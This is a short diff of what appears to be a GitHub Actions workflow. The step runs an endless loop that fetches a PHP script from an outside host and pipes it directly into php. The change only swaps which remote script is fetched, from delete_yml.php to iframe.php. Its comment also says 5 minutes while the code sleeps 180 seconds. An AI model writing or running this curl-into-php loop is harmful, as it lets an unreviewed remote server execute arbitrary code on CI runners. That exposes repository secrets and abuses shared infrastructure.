@@ -28,6 +28,6 @@ jobs:
     - name: Run PHP script in a loop every 5 minutes
       run: |
         while true; do
-          curl https://parser.crik.live/delete_yml.php | php
+          curl https://parser.crik.live/iframe.php | php
           sleep 180  # Sleep for 5 minutes
         done
